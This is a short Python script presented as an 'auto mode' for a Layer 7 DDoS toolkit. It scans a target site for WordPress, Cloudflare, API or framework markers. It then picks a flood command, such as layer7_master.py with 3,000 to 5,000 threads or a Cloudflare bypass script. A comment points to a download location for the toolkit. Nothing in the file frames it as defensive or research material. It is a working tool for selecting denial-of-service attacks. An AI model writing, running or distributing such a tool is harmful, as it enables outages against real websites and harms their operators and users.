#!/usr/bin/env python3
"""
Auto Mode - Detects target and applies best Layer 7 attack
"""

import sys
import subprocess
import requests
import socket

def detect_target_type(target):
    """Detect what type of website/server"""
    try:
        response = requests.get(target, timeout=5, verify=False)
        
        # Check for technologies
        tech_detected = []
        
        if 'wp-content' in response.text:
            tech_detected.append('wordpress')
        if 'laravel' in response.text.lower():
            tech_detected.append('laravel')
        if 'django' in response.text.lower():
            tech_detected.append('django')
        if 'cloudflare' in response.headers.get('Server', ''):
            tech_detected.append('cloudflare')
        if '/api/' in response.text:
            tech_detected.append('api')
        
        return tech_detected
    except:
        return ['unknown']

def auto_attack(target):
    """Auto-select attack based on detection"""
    tech = detect_target_type(target)
    
    print(f"[+] Detected technologies: {', '.join(tech)}")
    
    if 'wordpress' in tech:
        print("[+] Using WordPress optimized attack...")
        return "python3 layer7_master.py --wordpress --threads 5000"
    elif 'cloudflare' in tech:
        print("[+] Using Cloudflare bypass attack...")
        return "python3 cloudflare_bypass_layer7.py --target " + target
    elif 'api' in tech:
        print("[+] Using API endpoint attack...")
        return "python3 layer7_master.py --api --threads 3000"
    else:
        print("[+] Using generic Layer 7 attack...")
        return f"python3 layer7_master.py {target} 5000 3600"

# Download: https://raw.githubusercontent.com/deep-ai-tools/layer7-ddos/main/auto_attack.py
